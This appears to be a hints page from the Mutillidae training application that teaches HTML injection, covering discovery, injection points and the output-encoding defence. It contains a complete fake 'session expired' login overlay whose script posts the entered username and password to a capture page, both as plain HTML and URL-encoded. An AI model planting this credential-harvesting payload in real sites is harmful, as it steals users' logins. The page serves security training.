			<br/><br/>
			<span class="report-header">Overview</span>
			<br/><br/>
			HTML Injection may occcur
			when user or attacker controlled input is later incorporated
			without being encoded into the web server response. In other words, the attacker
			can send input which later is incorporated into the web page the user receives.
			<br/><br/>
			<a href="#videos" class="label"><img alt="YouTube" src="/images/youtube-play-icon-40-40.png" style="margin-right: 10px;" />Video Tutorials</a>
			<br/><br/>
			<span class="report-header">Discovery Methodology</span>
			<br/><br/>
			Inject all available parameters of the web page with a searchable string
			such as the word "CANARY" along with characters generally useful in
			writing HTML, JavaScript or other code. Search the response carefully
			noting any location where the test string appears unencoded. These
			locations may allow HTML Injection.
			<br/><br/>
			Hint: An example injection might be &lt;CANARY={}&quot;&quot;()&#39;&#39;;#$--/&gt;1.
			Adding a sequencial integer to the test input can help determine which of the
			inputs parameters resulted in the response string found.
			<br/><br/>
			<span class="report-header">Exploitation</span>
			<br/><br/>
			Determine the prefix and suffix needed to make the injected code "fit" syntatically
			then add a payload between. Inject the exploit.
			<br/><br/>
			Example (does not include prefix or suffix):
<br/>
<code>
&lt;h1&gt;Hello&amp;nbsp;World&lt;/h1&gt;
</code>
			<br/>
			Some pages are easier to exploit because the page reflects any input. This input
			could be from the Cookies, and URL query parameter, or any POSTed parameter.
			This may be seen in the view source as a comment in which the developer
			dumps the referer string for diagnostic purpouses (and therefore dumps
			the query parameters as well). When a random parameter is created and injected,
			this is known as a parameter addition attack.
			<br/><br/>
			<span class="report-header">HTML Injection Via URL query parameters</span>
			<br/><br/>
			Note any URL query parameters and inject a valid html payload into each.
			<br/><br/>
			<span class="report-header">HTML Injection Via POST parameters</span>
			<br/><br/>
			Use Burp-Suite to note POST parameters and inject a valid html payload into each.
			<br/><br/>
			<span class="report-header">HTML Injection Via Cookie</span>
			<br/><br/>
			Use Cookie Manager or Burp-Suite to inject a valid html payload into each cookie.
			If the page prints the value of the cookie to the screen, the html payload
			will execute.
			<br/><br/>
			<span class="report-header">Example</span>
			<br/><br/>
			Inject the Browser User Agent String HTTP Header with HTML using a tool like User Agent Switcher.
			<br/><br/>
			<textarea cols="80" rows="3">
			&lt;h1&gt;Sorry, please login again&lt;/h1&gt;&lt;br/&gt;Username&lt;input type=&quot;text&quot;&gt;&lt;br/&gt;Password&lt;input type=&quot;text&quot;&gt;&lt;br/&gt;&lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt;&lt;h1&gt;&amp;nbsp;&lt;/h1&gt;
			</textarea>
			<br/><br/>
			Inject in general HTML fields such as the field "blog contents" on page "add-to-your-blog.php". Complex injections
			usually require URI encoding to prevent reserved characters from being
			stripped or interpreted by the web server. Burp-Decoder can URI encode strings.
			<br/><br/>
			<textarea cols="80" rows="20">
	&lt;div id=&quot;modal&quot; style=&quot;position:fixed;top:0;left:0;width:100%;height:100%;background-color:black;opacity:.5;z-index:999998;&quot;&gt;&amp;nbsp;&lt;/div&gt;
	&lt;div style=&quot;margin:5% auto;width:100%;position:fixed;top:5%;left:5%;z-index:9999999;&quot;&gt;
	&lt;div id=&quot;idlogin&quot; style=&quot;width:405px;position:relative;margin:0 auto;background-color:white;padding:10px;border:1px solid black;&quot;&gt;
	&lt;script&gt;
	function capture(theForm){
		var lXMLHTTP;
		try{
			var lData = &quot;username=&quot; + theForm.username.value + &quot;&amp;password=&quot; + theForm.password.value;
			var lHost = &quot;localhost&quot;;
			var lProtocol = &quot;http&quot;;
			var lAction = lProtocol + &quot;://&quot; + lHost + &quot;/mutillidae/capture-data.php&quot;;
			var lMethod = &quot;post&quot;;
			try{
				lXMLHTTP = new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;);
			}catch (e){
				try{
					lXMLHTTP = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);
				}catch(e) {
					try{
						lXMLHTTP = new XMLHttpRequest();
					}catch (e) {
						alert(e.message);
					};//end try
				};//end try
			};//end try

			lXMLHTTP.onreadystatechange = function(){
				if(lXMLHTTP.readyState == 4){
					theForm.parentNode.style.display=&quot;none&quot;;
				}// end if
			};

			lXMLHTTP.open(lMethod, lAction, true);
			lXMLHTTP.setRequestHeader(&quot;Host&quot;, lHost);
			lXMLHTTP.setRequestHeader(&quot;Content-Type&quot;, &quot;application/x-www-form-urlencoded&quot;);
			lXMLHTTP.send(lData);
		}catch(e){
			alert(e.message);
		};
		alert(&#39;Thanks! You may continue now.&#39;);
		document.getElementById(&#39;modal&#39;).setAttribute(&#39;style&#39;, &#39;&#39;);
	};//end function
	&lt;/script&gt;
	&lt;form&gt;
		&lt;table style=&quot;font-weight:bold;&quot;&gt;
			&lt;tbody&gt;&lt;tr&gt;&lt;td colspan=&quot;2&quot; style=&quot;font-size:20px;&quot;&gt;Sorry! Your session has expired.&lt;br&gt;&lt;br&gt;Please login again.&lt;/td&gt;&lt;/tr&gt;
			&lt;tr&gt;&lt;td colspan=&quot;2&quot;&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;
			&lt;tr&gt;&lt;td&gt;Username&lt;/td&gt;&lt;td&gt;&lt;input name=&quot;username&quot; type=&quot;text&quot;&gt;&lt;/td&gt;&lt;/tr&gt;
			&lt;tr&gt;&lt;td&gt;Password&lt;/td&gt;&lt;td&gt;&lt;input name=&quot;password&quot; type=&quot;password&quot;&gt;&lt;/td&gt;&lt;/tr&gt;
			&lt;tr&gt;&lt;td colspan=&quot;2&quot; style=&quot;text-align:center;&quot;&gt;&lt;input type=&quot;button&quot; onclick=&quot;javascript:capture(this.form);&quot; value=&quot;      Submit      &quot;&gt;&lt;/td&gt;&lt;/tr&gt;
		&lt;/tbody&gt;&lt;/table&gt;
	&lt;/form&gt;
&lt;/div&gt;
			</textarea>
			<br/><br/>
			Note that some characters which are reserved in databases are also reserved
			in web servers. If submitting injections directly via an interception proxy
			like Burp-Suite, URL encode the injection to avoid a syntax error on the
			web server.
			<br/><br/>
			<span class="report-header">URL Encoded version (with TAB spaces (%09) removed</span>
			<br/>
<code>
%3c%64%69%76%20%69%64%3d%22%6d%6f%64%61%6c%22%20%73%74%79%6c%65%3d%22%70%6f%73%69%74%69%6f%6e%3a%66%69%78%65%64%3b%74%6f%70%3a%30%3b%6c%65%66%74%3a%30%3b%77%69%64%74%68%3a%31%30%30%25%3b%68%65%69%67%68%74%3a%31%30%30%25%3b%62%61%63%6b%67%72%6f%75%6e%64%2d%63%6f%6c%6f%72%3a%62%6c%61%63%6b%3b%6f%70%61%63%69%74%79%3a%2e%35%3b%7a%2d%69%6e%64%65%78%3a%39%39%39%39%39%38%3b%22%3e%26%6e%62%73%70%3b%3c%2f%64%69%76%3e%0a%3c%64%69%76%20%73%74%79%6c%65%3d%22%6d%61%72%67%69%6e%3a%35%25%20%61%75%74%6f%3b%77%69%64%74%68%3a%31%30%30%25%3b%70%6f%73%69%74%69%6f%6e%3a%66%69%78%65%64%3b%74%6f%70%3a%35%25%3b%6c%65%66%74%3a%35%25%3b%7a%2d%69%6e%64%65%78%3a%39%39%39%39%39%39%39%3b%22%3e%0a%3c%64%69%76%20%69%64%3d%22%69%64%6c%6f%67%69%6e%22%20%73%74%79%6c%65%3d%22%77%69%64%74%68%3a%34%30%35%70%78%3b%70%6f%73%69%74%69%6f%6e%3a%72%65%6c%61%74%69%76%65%3b%6d%61%72%67%69%6e%3a%30%20%61%75%74%6f%3b%62%61%63%6b%67%72%6f%75%6e%64%2d%63%6f%6c%6f%72%3a%77%68%69%74%65%3b%70%61%64%64%69%6e%67%3a%31%30%70%78%3b%62%6f%72%64%65%72%3a%31%70%78%20%73%6f%6c%69%64%20%62%6c%61%63%6b%3b%22%3e%0a%3c%73%63%72%69%70%74%3e%0a%66%75%6e%63%74%69%6f%6e%20%63%61%70%74%75%72%65%28%74%68%65%46%6f%72%6d%29%7b%0a%76%61%72%20%6c%58%4d%4c%48%54%54%50%3b%0a%74%72%79%7b%20%0a%76%61%72%20%6c%44%61%74%61%20%3d%20%22%75%73%65%72%6e%61%6d%65%3d%22%20%2b%20%74%68%65%46%6f%72%6d%2e%75%73%65%72%6e%61%6d%65%2e%76%61%6c%75%65%20%2b%20%22%26%70%61%73%73%77%6f%72%64%3d%22%20%2b%20%74%68%65%46%6f%72%6d%2e%70%61%73%73%77%6f%72%64%2e%76%61%6c%75%65%3b%0a%76%61%72%20%6c%48%6f%73%74%20%3d%20%22%6c%6f%63%61%6c%68%6f%73%74%22%3b%0a%76%61%72%20%6c%50%72%6f%74%6f%63%6f%6c%20%3d%20%22%68%74%74%70%22%3b%0a%76%61%72%20%6c%41%63%74%69%6f%6e%20%3d%20%6c%50%72%6f%74%6f%63%6f%6c%20%2b%20%22%3a%2f%2f%22%20%2b%20%6c%48%6f%73%74%20%2b%20%22%2f%6d%75%74%69%6c%6c%69%64%61%65%2f%63%61%70%74%75%72%65%2d%64%61%74%61%2e%70%68%70%22%3b%0a%76%61%72%20%6c%4d%65%74%68%6f%64%20%3d%20%22%70%6f%73%74%22%3b%0a%74%72%79%7b%0a%6c%58%4d%4c%48%54%54%50%20%3d%20%6e%65%77%20%41%63%74%69%76%65%58%4f%62%6a%65%63%74%28%22%4d%73%78%6d%6c%32%2e%58%4d%4c%48%54%54%50%22%29%3b%20%0a%7d%63%61%74%63%68%20%28%65%29%7b%20%0a%74%72%79%7b%20%0a%6c%58%4d%4c%48%54%54%50%20%3d%20%6e%65%77%20%41%63%74%69%76%65%58%4f%62%6a%65%63%74%28%22%4d%69%63%72%6f%73%6f%66%74%2e%58%4d%4c%48%54%54%50%22%29%3b%20%0a%7d%63%61%74%63%68%28%65%29%20%7b%20%0a%74%72%79%7b%20%0a%6c%58%4d%4c%48%54%54%50%20%3d%20%6e%65%77%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%28%29%3b%20%0a%7d%63%61%74%63%68%20%28%65%29%20%7b%20%0a%61%6c%65%72%74%28%65%2e%6d%65%73%73%61%67%65%29%3b%2f%2f%54%48%49%53%20%4c%49%4e%45%20%49%53%20%54%45%53%54%49%4e%47%20%41%4e%44%20%44%45%4d%4f%4e%53%54%52%41%54%49%4f%4e%20%4f%4e%4c%59%2e%20%44%4f%20%4e%4f%54%20%49%4e%43%4c%55%44%45%20%49%4e%20%50%45%4e%20%54%45%53%54%2e%20%0a%7d%3b%2f%2f%65%6e%64%20%74%72%79%0a%7d%3b%2f%2f%65%6e%64%20%74%72%79%0a%7d%3b%2f%2f%65%6e%64%20%74%72%79%0a%20%0a%6c%58%4d%4c%48%54%54%50%2e%6f%6e%72%65%61%64%79%73%74%61%74%65%63%68%61%6e%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%7b%20%0a%69%66%28%6c%58%4d%4c%48%54%54%50%2e%72%65%61%64%79%53%74%61%74%65%20%3d%3d%20%34%29%7b%20%0a%74%68%65%46%6f%72%6d%2e%70%61%72%65%6e%74%4e%6f%64%65%2e%73%74%79%6c%65%2e%64%69%73%70%6c%61%79%3d%22%6e%6f%6e%65%22%3b%20%0a%7d%2f%2f%20%65%6e%64%20%69%66%20%0a%7d%3b%0a%0a%6c%58%4d%4c%48%54%54%50%2e%6f%70%65%6e%28%6c%4d%65%74%68%6f%64%2c%20%6c%41%63%74%69%6f%6e%2c%20%74%72%75%65%29%3b%0a%6c%58%4d%4c%48%54%54%50%2e%73%65%74%52%65%71%75%65%73%74%48%65%61%64%65%72%28%22%48%6f%73%74%22%2c%20%6c%48%6f%73%74%29%3b%20%0a%6c%58%4d%4c%48%54%54%50%2e%73%65%74%52%65%71%75%65%73%74%48%65%61%64%65%72%28%22%43%6f%6e%74%65%6e%74%2d%54%79%70%65%22%2c%20%22%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%2d%77%77%77%2d%66%6f%72%6d%2d%75%72%6c%65%6e%63%6f%64%65%64%22%29%3b%20%0a%6c%58%4d%4c%48%54%54%50%2e%73%65%6e%64%28%6c%44%61%74%61%29%3b%0a%7d%63%61%74%63%68%28%65%29%7b%20%0a%61%6c%65%72%74%28%65%2e%6d%65%73%73%61%67%65%29%3b%2f%2f%54%48%49%53%20%4c%49%4e%45%20%49%53%20%54%45%53%54%49%4e%47%20%41%4e%44%20%44%45%4d%4f%4e%53%54%52%41%54%49%4f%4e%20%4f%4e%4c%59%2e%20%44%4f%20%4e%4f%54%20%49%4e%43%4c%55%44%45%20%49%4e%20%50%45%4e%20%54%45%53%54%2e%20%0a%7d%3b%0a%61%6c%65%72%74%28%27%54%68%61%6e%6b%73%21%20%59%6f%75%20%6d%61%79%20%63%6f%6e%74%69%6e%75%65%20%6e%6f%77%2e%27%29%3b%0a%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%27%6d%6f%64%61%6c%27%29%2e%73%65%74%41%74%74%72%69%62%75%74%65%28%27%73%74%79%6c%65%27%2c%20%27%27%29%3b%0a%7d%3b%2f%2f%65%6e%64%20%66%75%6e%63%74%69%6f%6e%0a%3c%2f%73%63%72%69%70%74%3e%0a%3c%66%6f%72%6d%3e%0a%3c%74%61%62%6c%65%20%73%74%79%6c%65%3d%22%66%6f%6e%74%2d%77%65%69%67%68%74%3a%62%6f%6c%64%3b%22%3e%0a%3c%74%62%6f%64%79%3e%3c%74%72%3e%3c%74%64%20%63%6f%6c%73%70%61%6e%3d%22%32%22%20%73%74%79%6c%65%3d%22%66%6f%6e%74%2d%73%69%7a%65%3a%32%30%70%78%3b%22%3e%53%6f%72%72%79%21%20%59%6f%75%72%20%73%65%73%73%69%6f%6e%20%68%61%73%20%65%78%70%69%72%65%64%2e%3c%62%72%3e%3c%62%72%3e%50%6c%65%61%73%65%20%6c%6f%67%69%6e%20%61%67%61%69%6e%2e%3c%2f%74%64%3e%3c%2f%74%72%3e%0a%3c%74%72%3e%3c%74%64%20%63%6f%6c%73%70%61%6e%3d%22%32%22%3e%26%6e%62%73%70%3b%3c%2f%74%64%3e%3c%2f%74%72%3e%0a%3c%74%72%3e%3c%74%64%3e%55%73%65%72%6e%61%6d%65%3c%2f%74%64%3e%3c%74%64%3e%3c%69%6e%70%75%74%20%6e%61%6d%65%3d%22%75%73%65%72%6e%61%6d%65%22%20%74%79%70%65%3d%22%74%65%78%74%22%3e%3c%2f%74%64%3e%3c%2f%74%72%3e%0a%3c%74%72%3e%3c%74%64%3e%50%61%73%73%77%6f%72%64%3c%2f%74%64%3e%3c%74%64%3e%3c%69%6e%70%75%74%20%6e%61%6d%65%3d%22%70%61%73%73%77%6f%72%64%22%20%74%79%70%65%3d%22%70%61%73%73%77%6f%72%64%22%3e%3c%2f%74%64%3e%3c%2f%74%72%3e%0a%3c%74%72%3e%3c%74%64%20%63%6f%6c%73%70%61%6e%3d%22%32%22%20%73%74%79%6c%65%3d%22%74%65%78%74%2d%61%6c%69%67%6e%3a%63%65%6e%74%65%72%3b%22%3e%3c%69%6e%70%75%74%20%74%79%70%65%3d%22%62%75%74%74%6f%6e%22%20%6f%6e%63%6c%69%63%6b%3d%22%6a%61%76%61%73%63%72%69%70%74%3a%63%61%70%74%75%72%65%28%74%68%69%73%2e%66%6f%72%6d%29%3b%22%20%76%61%6c%75%65%3d%22%20%20%20%20%20%20%53%75%62%6d%69%74%20%20%20%20%20%20%22%3e%3c%2f%74%64%3e%3c%2f%74%72%3e%0a%3c%2f%74%62%6f%64%79%3e%3c%2f%74%61%62%6c%65%3e%0a%3c%2f%66%6f%72%6d%3e%0a%3c%2f%64%69%76%3e
</code>
<br/><br/>
<span class="report-header">Defense</span>
<br/><br/>
HTML encode all output supplied outside of the application source code
including but not limited to database records and all parameters
submitted by the browser.
<br/><br/>
<span id="videos" class="report-header">Videos</span>
<br/><br/>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->CrossSiteScriptingPart1WhatisReflectedXSS);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->CrossSiteScriptingPart2WhatisDOMbasedXSS);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->CrossSiteScriptingPart3WhatisPersistentXSS);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->OutputEncodingPart1HowItStopsCrosssiteScriptingXSS);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->OutputEncodingPart2HowtoTestifitWorks);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->WhatisContentSecurityPolicyPart1);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->WhatisContentSecurityPolicyPart2);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->WhatisContentSecurityPolicyPart3);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->WhatisContentSecurityPolicyPart4);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->WhatisContentSecurityPolicyPart5);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->ContentSecurityPolicyScriptSourcescriptsrc);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->HowtoSetHTTPHeadersUsingApacheServer);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->CheckHTTPHeaderswithcURL);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->HowtoCheckHTTPHeadersCommandLine);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->HowtoCheckHTTPHeadersfromBrowser);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->CookiesPart1HowHTTPOnlyWorks);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->WhatistheXSSProtectionHeader);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->CheckforVulnerableLibrariesinYourWebApplication);?>
<?php echo $YouTubeVideoHandler->getYouTubeVideo($YouTubeVideoHandler->HowtoEnableApacheModHeader);?>
<br/><br/>